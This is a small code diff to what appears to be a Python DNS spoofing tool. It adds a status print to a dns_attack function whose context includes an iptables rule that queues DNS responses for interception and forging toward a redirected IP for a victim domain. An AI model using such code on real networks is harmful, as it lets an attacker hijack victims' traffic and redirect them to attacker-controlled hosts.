@@ -37,6 +37,7 @@ def dns_response(pkt, interface, redirected_ip, victim_domain=None, verbose=Fals
         print("Packet forwarded\n")
 
 def dns_attack(interface, redirected_ip, victim_domain=None, verbose=False):
+    print('DNS attack running...')
     # Setup iptables
     #os.system("iptables -A FORWARD -j ACCEPT")
     os.system("iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0")
